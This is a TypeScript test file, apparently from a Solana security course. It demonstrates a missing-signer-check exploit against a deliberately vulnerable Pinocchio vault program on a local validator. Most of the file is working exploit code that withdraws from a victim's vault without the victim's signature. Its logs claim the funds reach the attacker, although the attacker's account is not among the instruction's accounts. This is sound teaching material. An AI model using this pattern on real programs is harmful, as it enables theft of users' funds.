/**
 * EXPLOIT TEST: Missing Signer Check (Pinocchio)
 * 
 * This test demonstrates the missing signer check vulnerability in the Pinocchio program.
 * 
 * Vulnerability: The withdraw function doesn't check if the user account is a signer,
 * allowing anyone to withdraw funds by simply passing the victim's public key without
 * actually signing the transaction.
 * 
 * Expected Result: The exploit should SUCCEED, demonstrating the vulnerability.
 * 
 * Note: Pinocchio programs don't have IDLs, so we manually construct transactions
 * with instruction discriminators and serialized data.
 */

import {
    Connection,
    Keypair,
    PublicKey,
    SystemProgram,
    Transaction,
    TransactionInstruction,
    LAMPORTS_PER_SOL,
    sendAndConfirmTransaction,
} from "@solana/web3.js";

describe("01-missing-signer-check: Pinocchio Exploit", () => {
    const connection = new Connection("http://localhost:8899", "confirmed");

    // This should match the program ID in the vulnerable Pinocchio program
    const PROGRAM_ID = new PublicKey("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS");

    // Instruction discriminators (from the Pinocchio program)
    const INITIALIZE_DISCRIMINATOR = 0;
    const DEPOSIT_DISCRIMINATOR = 1;
    const WITHDRAW_DISCRIMINATOR = 2;

    it("Exploits missing signer check to drain victim's vault", async () => {
        console.log("\nüéØ EXPLOIT: Missing Signer Check (Pinocchio)\n");

        // Create victim and attacker wallets
        const victim = Keypair.generate();
        const attacker = Keypair.generate();

        console.log("üë§ Victim:", victim.publicKey.toBase58());
        console.log("ü¶π Attacker:", attacker.publicKey.toBase58());

        // Airdrop SOL to victim and attacker
        const airdropVictim = await connection.requestAirdrop(
            victim.publicKey,
            2 * LAMPORTS_PER_SOL
        );
        await connection.confirmTransaction(airdropVictim);

        const airdropAttacker = await connection.requestAirdrop(
            attacker.publicKey,
            1 * LAMPORTS_PER_SOL
        );
        await connection.confirmTransaction(airdropAttacker);

        // Derive vault PDA for victim
        const [vaultPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("vault"), victim.publicKey.toBuffer()],
            PROGRAM_ID
        );

        console.log("üè¶ Vault PDA:", vaultPda.toBase58());

        // Step 1: Victim initializes their vault
        console.log("\nüìù Step 1: Victim initializes vault...");

        const initializeIx = new TransactionInstruction({
            keys: [
                { pubkey: victim.publicKey, isSigner: true, isWritable: true },
                { pubkey: vaultPda, isSigner: false, isWritable: true },
            ],
            programId: PROGRAM_ID,
            data: Buffer.from([INITIALIZE_DISCRIMINATOR]),
        });

        const initTx = new Transaction().add(initializeIx);
        await sendAndConfirmTransaction(connection, initTx, [victim]);
        console.log("‚úÖ Vault initialized");

        // Step 2: Victim deposits funds
        const depositAmount = 1 * LAMPORTS_PER_SOL;
        console.log(`\nüí∞ Step 2: Victim deposits ${depositAmount / LAMPORTS_PER_SOL} SOL...`);

        const depositData = Buffer.alloc(9);
        depositData.writeUInt8(DEPOSIT_DISCRIMINATOR, 0);
        depositData.writeBigUInt64LE(BigInt(depositAmount), 1);

        const depositIx = new TransactionInstruction({
            keys: [
                { pubkey: victim.publicKey, isSigner: true, isWritable: true },
                { pubkey: vaultPda, isSigner: false, isWritable: true },
            ],
            programId: PROGRAM_ID,
            data: depositData,
        });

        const depositTx = new Transaction().add(depositIx);
        await sendAndConfirmTransaction(connection, depositTx, [victim]);

        const vaultBalanceAfterDeposit = await connection.getBalance(vaultPda);
        console.log(`‚úÖ Vault balance: ${vaultBalanceAfterDeposit / LAMPORTS_PER_SOL} SOL`);

        // Step 3: Attacker attempts to withdraw (EXPLOIT)
        const withdrawAmount = 0.5 * LAMPORTS_PER_SOL;
        console.log(`\nüö® Step 3: Attacker attempts to withdraw ${withdrawAmount / LAMPORTS_PER_SOL} SOL...`);
        console.log("‚ö†Ô∏è  Using victim's public key but attacker's signature!");

        const attackerBalanceBefore = await connection.getBalance(attacker.publicKey);

        try {
            const withdrawData = Buffer.alloc(9);
            withdrawData.writeUInt8(WITHDRAW_DISCRIMINATOR, 0);
            withdrawData.writeBigUInt64LE(BigInt(withdrawAmount), 1);

            // ‚ùå VULNERABILITY: Pass victim's key but attacker signs
            const withdrawIx = new TransactionInstruction({
                keys: [
                    { pubkey: victim.publicKey, isSigner: false, isWritable: true }, // ‚ùå Victim's key, not marked as signer
                    { pubkey: vaultPda, isSigner: false, isWritable: true },
                ],
                programId: PROGRAM_ID,
                data: withdrawData,
            });

            const withdrawTx = new Transaction().add(withdrawIx);
            await sendAndConfirmTransaction(connection, withdrawTx, [attacker]); // ‚ùå Attacker signs!

            const attackerBalanceAfter = await connection.getBalance(attacker.publicKey);
            const vaultBalanceAfter = await connection.getBalance(vaultPda);

            console.log("\nüí• EXPLOIT SUCCESSFUL!");
            console.log(`ü¶π Attacker balance change: +${(attackerBalanceAfter - attackerBalanceBefore) / LAMPORTS_PER_SOL} SOL (approx, minus fees)`);
            console.log(`üè¶ Vault balance after exploit: ${vaultBalanceAfter / LAMPORTS_PER_SOL} SOL`);
            console.log("\n‚ö†Ô∏è  The vulnerability allowed unauthorized withdrawal!");

        } catch (error) {
            console.log("\n‚ùå EXPLOIT FAILED (unexpected)");
            console.log("Error:", error.message);
            throw new Error("Exploit should have succeeded but failed. Check program deployment.");
        }
    });
});
